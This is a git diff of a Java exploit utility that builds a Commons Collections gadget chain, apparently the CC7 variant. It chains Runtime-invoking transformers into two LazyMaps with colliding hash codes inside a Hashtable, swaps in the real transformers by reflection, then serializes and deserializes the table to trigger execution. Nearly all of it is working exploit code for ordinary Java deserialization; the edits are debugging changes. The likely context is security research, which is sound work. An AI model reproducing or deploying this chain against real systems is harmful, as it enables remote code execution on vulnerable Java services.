@@ -171,10 +171,6 @@ public class ExpUtils {
     public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, InvocationTargetException {
         System.out.println(System.getProperty("java.version"));
 
-//        Objects.equals(a,v)
-
-        System.out.println("1".hashCode());
-
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
@@ -187,26 +183,34 @@ public class ExpUtils {
 
         ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
 
-
-
-        Map innerHashMap1 = new HashMap();
-        Map innerHashMap2 = new HashMap();
-        Map lazyMap1 = LazyMap.decorate(innerHashMap1, chainedTransformer);  // 生成了LazyMap  不可反序列化的map
+        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
+        System.out.println(innerMap1==innerMap2);
+        System.out.println(innerMap2.hashCode());
+        Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);  // 生成了LazyMap  不可反序列化的map
         lazyMap1.put("yy",1);
-        System.out.println("lazyMap1 hashCode:" + lazyMap1.hashCode());
-        System.out.println(innerHashMap1.hashCode());
-        Map lazyMap2 = LazyMap.decorate(innerHashMap2, chainedTransformer);
-        lazyMap2.put("zZ",1);
-        System.out.println("lazyMap2 hashCode:" + lazyMap2.hashCode());
+        Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
 
-        Hashtable objectObjectHashtable = new Hashtable();
-        objectObjectHashtable.put(lazyMap1,3);
-        objectObjectHashtable.put(lazyMap2,4);
+        lazyMap2.put("zZ",2);
+        System.out.println(lazyMap1.size());
+        System.out.println(lazyMap2.size());
+        System.out.println("-------");
+        System.out.println(lazyMap1.hashCode());
+        System.out.println(lazyMap2.hashCode());
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1,1);
+        hashtable.put(lazyMap2,2);
 
+        System.out.println(lazyMap1.size());
+        System.out.println(lazyMap2.size());
         ReflectUtils.setFields(chainedTransformer,"iTransformers", transformers);
-//        lazyMap2.remove("123");
-        String path =  serialize(objectObjectHashtable);
-        Hashtable obj = (Hashtable) unserialize(path);
+        lazyMap2.remove("zZ");
+        lazyMap2.put("zZ",1);
+        System.out.println("hashTableSize:" + hashtable.size() );
+//        lazyMap2.remove("yy");
+//        hashtable.remove("yy");
+        String path =  serialize(hashtable);
+        unserialize(path);
 //        System.out.println(obj);
 
     }
